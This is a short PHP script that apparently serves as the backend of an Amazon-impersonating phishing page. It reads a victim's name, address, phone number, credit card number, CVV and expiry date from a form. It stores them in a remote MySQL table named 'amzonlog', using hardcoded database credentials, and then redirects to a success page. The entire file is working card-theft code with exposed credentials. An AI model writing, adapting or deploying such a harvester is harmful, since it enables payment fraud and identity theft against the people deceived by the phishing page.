<?php
$server = "sql10.freemysqlhosting.net";
$user = "sql10334343";
$pass = "KxXrhmwsUv";
$dbname = "sql10334343";
 
//Creating connection for mysqli
 
$conn = new mysqli($server, $user, $pass, $dbname);
 
//Checking connection
 
if($conn->connect_error){
 die("Connection failed:" . $conn->connect_error);
}

$fname = mysqli_real_escape_string($conn, $_POST['fname']); 
$add1 = mysqli_real_escape_string($conn, $_POST['add1']);
$add2 = mysqli_real_escape_string($conn, $_POST['add2']);
$city = mysqli_real_escape_string($conn, $_POST['city']);
$state = mysqli_real_escape_string($conn, $_POST['state']);
$zipcode = mysqli_real_escape_string($conn, $_POST['zipcode']); 
$phone = mysqli_real_escape_string($conn, $_POST['phone']);
$ccname = mysqli_real_escape_string($conn, $_POST['ccname']);
$ccnumber = mysqli_real_escape_string($conn, $_POST['ccnumber']);
$cvv = mysqli_real_escape_string($conn, $_POST['cvv']);
$expmonth = mysqli_real_escape_string($conn, $_POST['expmonth']);
$expyear = mysqli_real_escape_string($conn, $_POST['expyear']);
 
$sql = "INSERT INTO amzonlog (fname,add1,add2,city,state,zipcode,phone,ccname,ccnumber,cvv,expmonth,expyear) VALUES ('$fname','$add1','$add2','$city','$state','$zipcode','$phone','$ccname','$ccnumber','$cvv','$expmonth','$expyear')";
 
if($conn->query($sql) === TRUE){
 header("Location: success.html");
}
else
{
 echo "Error" . $sql . "<br/>" . $conn->error;
}
$conn->close();
?>